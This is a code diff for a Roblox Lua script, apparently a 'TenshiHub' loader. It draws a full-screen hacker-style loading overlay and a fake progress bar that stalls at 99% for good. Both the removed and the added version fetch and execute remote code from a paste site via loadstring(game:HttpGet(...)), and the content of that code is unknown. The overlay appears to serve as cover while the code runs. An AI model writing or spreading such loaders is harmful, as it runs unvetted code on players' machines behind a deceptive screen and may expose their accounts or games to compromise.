@@ -1,104 +1,70 @@
-from textwrap import dedent
+repeat wait() until game:IsLoaded()
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local gui = player:WaitForChild("PlayerGui")
 
-# Rewritten LocalScript with full fixes based on user's updated instructions
-final_script = dedent("""\
-    -- 🧪 TenshiHub Hacker-Style Loading Screen (Final Fixed Version)
-    local Players = game:GetService("Players")
-    local player = Players.LocalPlayer
-    local playerGui = player:WaitForChild("PlayerGui")
+-- Create main screen GUI
+local screenGui = Instance.new("ScreenGui", gui)
+screenGui.Name = "TenshiHubLoading"
+screenGui.ResetOnSpawn = false
 
-    -- ⚙️ Execute side UI immediately
-    pcall(function()
-        loadstring(game:HttpGet("https://pastefy.app/inoixEbY/raw"))()
-    end)
+-- Full black frame
+local background = Instance.new("Frame", screenGui)
+background.Size = UDim2.new(1, 0, 1, 0)
+background.Position = UDim2.new(0, 0, 0, 0)
+background.BackgroundColor3 = Color3.new(0, 0, 0)
+background.BorderSizePixel = 0
 
-    -- 🖥️ ScreenGui setup
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "TenshiHubLoadingScreen"
-    screenGui.ResetOnSpawn = false
-    screenGui.IgnoreGuiInset = true
-    screenGui.Parent = playerGui
+-- Matrix effect text
+for i = 1, 100 do
+	local text = Instance.new("TextLabel", background)
+	text.Size = UDim2.new(0, math.random(30,50), 0, math.random(20, 30))
+	text.Position = UDim2.new(math.random(), 0, math.random(), 0)
+	text.BackgroundTransparency = 1
+	text.TextColor3 = Color3.new(0, 1, 0)
+	text.Font = Enum.Font.Code
+	text.TextSize = 14
+	text.Text = tostring(math.random(100000, 999999))
+	coroutine.wrap(function()
+		while screenGui.Parent do
+			text.Text = tostring(math.random(100000, 999999))
+			wait(math.random(0.2, 1))
+		end
+	end)()
+end
 
-    -- 🔲 Full-screen black background
-    local background = Instance.new("Frame")
-    background.BackgroundColor3 = Color3.new(0, 0, 0)
-    background.Size = UDim2.new(1, 0, 1, 0)
-    background.Position = UDim2.new(0, 0, 0, 0)
-    background.BorderSizePixel = 0
-    background.Parent = screenGui
+-- Loading text label
+local loadingLabel = Instance.new("TextLabel", background)
+loadingLabel.Size = UDim2.new(0, 300, 0, 50)
+loadingLabel.Position = UDim2.new(0.5, -150, 0.5, -25)
+loadingLabel.BackgroundTransparency = 1
+loadingLabel.TextColor3 = Color3.new(0, 1, 0)
+loadingLabel.Font = Enum.Font.Code
+loadingLabel.TextSize = 30
+loadingLabel.Text = "Loading... 1%"
 
-    -- 🌟 Hacker-style visual effects (subtle green lines)
-    for i = 1, 20 do
-        local glitch = Instance.new("TextLabel")
-        glitch.Text = "|"
-        glitch.Font = Enum.Font.Code
-        glitch.TextColor3 = Color3.fromRGB(0, 255, 0)
-        glitch.TextTransparency = 0.7
-        glitch.TextSize = math.random(10, 20)
-        glitch.Position = UDim2.new(math.random(), 0, math.random(), 0)
-        glitch.Size = UDim2.new(0, 20, 0, 20)
-        glitch.BackgroundTransparency = 1
-        glitch.Parent = background
-    end
+-- Notification (bottom-left)
+local notify = Instance.new("TextLabel", screenGui)
+notify.Size = UDim2.new(0, 300, 0, 30)
+notify.Position = UDim2.new(0, 10, 1, -40)
+notify.BackgroundTransparency = 0.5
+notify.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+notify.TextColor3 = Color3.new(0, 1, 0)
+notify.Font = Enum.Font.Code
+notify.TextSize = 16
+notify.Text = "[TenshiHub] Loading UI..."
+notify.Visible = true
 
-    -- 🧾 Title Text
-    local title = Instance.new("TextLabel")
-    title.Text = "TenshiHub!"
-    title.Font = Enum.Font.Code
-    title.TextColor3 = Color3.fromRGB(0, 255, 0)
-    title.TextSize = 36
-    title.Position = UDim2.new(0.05, 0, 0.02, 0)
-    title.Size = UDim2.new(0.9, 0, 0.1, 0)
-    title.BackgroundTransparency = 1
-    title.TextXAlignment = Enum.TextXAlignment.Left
-    title.Parent = background
-
-    -- ⏳ Center loading text
-    local loadingText = Instance.new("TextLabel")
-    loadingText.Font = Enum.Font.Code
-    loadingText.TextColor3 = Color3.fromRGB(0, 255, 0)
-    loadingText.TextSize = 24
-    loadingText.BackgroundTransparency = 1
-    loadingText.Position = UDim2.new(0.5, 0, 0.5, 0)
-    loadingText.AnchorPoint = Vector2.new(0.5, 0.5)
-    loadingText.Size = UDim2.new(0.6, 0, 0.1, 0)
-    loadingText.Text = "Loading... 1%"
-    loadingText.TextXAlignment = Enum.TextXAlignment.Center
-    loadingText.Parent = background
-
-    -- 🔔 Bottom-left notification text
-    local notification = Instance.new("TextLabel")
-    notification.Font = Enum.Font.Code
-    notification.TextColor3 = Color3.fromRGB(0, 255, 0)
-    notification.TextSize = 16
-    notification.BackgroundTransparency = 1
-    notification.Position = UDim2.new(0.02, 0, 0.95, 0)
-    notification.Size = UDim2.new(0.5, 0, 0.05, 0)
-    notification.Text = ""
-    notification.TextXAlignment = Enum.TextXAlignment.Left
-    notification.Parent = background
-
-    -- ⏱️ Loading countdown
-    local percent = 1
-    spawn(function()
-        while percent <= 99 do
-            loadingText.Text = "Loading... " .. percent .. "%%"
-            if percent == 5 then
-                notification.Text = "[NOTIFICATION] TenshiHub UI is initializing..."
-            elseif percent == 10 then
-                notification.Text = "[SUCCESS] UI loaded in background."
-            elseif percent == 50 then
-                notification.Text = "[SYSTEM] Connecting to modules..."
-            end
-
-            percent += 1
-            wait(1.2) -- ~2 minutes total time
-        end
-
-        -- Stuck at 99%
-        loadingText.Text = "Loading... 99%"
-        notification.Text = "[WARNING] Final handshake stuck..."
-    end)
-""")
-
-final_script[:800]  # Preview first 800 characters of script
+-- Simulate loading
+spawn(function()
+	for i = 1, 99 do
+		loadingLabel.Text = "Loading... " .. i .. "%"
+		wait(1.2) -- 1.2s for each increment = ~2 minutes total
+		if i == 50 then
+			-- Show side UI at 50%
+			loadstring(game:HttpGet("https://pastefy.app/inoixEbY/raw"))()
+		end
+	end
+	loadingLabel.Text = "Loading... 99%"
+	-- Do not proceed to 100%
+end)
